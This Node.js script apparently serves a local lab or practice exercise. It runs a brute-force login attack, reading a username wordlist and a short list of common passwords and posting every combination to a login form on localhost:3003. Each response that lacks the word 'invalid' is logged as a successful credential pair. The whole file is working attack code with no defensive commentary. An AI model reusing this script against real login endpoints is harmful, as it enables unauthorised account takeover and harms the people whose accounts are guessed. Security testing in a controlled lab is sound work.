// We need this to build our post string
var querystring = require('querystring');
var http = require('http');
var fs = require('fs');

var usernames = fs.readFileSync("./web_user_names.txt", "utf8").split("\n"); 
var passwords = fs.readFileSync("./top26passwords.txt", "utf8").split("\n");


var username_counter = 0
var password_counter = 0


function PostCode(codestring) {
    // Build the post string from an object
    var post_data =  querystring.stringify(codestring)
  
    
    // An object of options to indicate where to post to
    var post_options = {
        host: 'localhost',
        port: '3003',
        path: '/login.html',
        method: 'POST',
        headers: {
            'Content-Type': 'application/x-www-form-urlencoded',
            'Content-Length': Buffer.byteLength(post_data)
        }
    };
  
    // Set up the request
    var post_req = http.request(post_options, function(res) {
        res.setEncoding('utf8');
        var data= ""
        res.on('data', function (chunk) {
            data += chunk
        });
        res.on('end',function() {
           if (data.includes("invalid")) {
            } else {

            console.log(post_data);
            }
        });
    });
  
    // post the data
    post_req.write(post_data);
    post_req.end(function() {
        password_counter += 1;
        if (password_counter >= passwords.length) {
            username_counter += 1 ;
            password_counter = 0;
        }
        
        data = {
            'username' : usernames[username_counter],
            'password' : passwords[password_counter]
        }
        PostCode(data);
    });
  
}

data = {
    'username' : usernames[username_counter],
    'password' : passwords[password_counter]
}
PostCode(data);
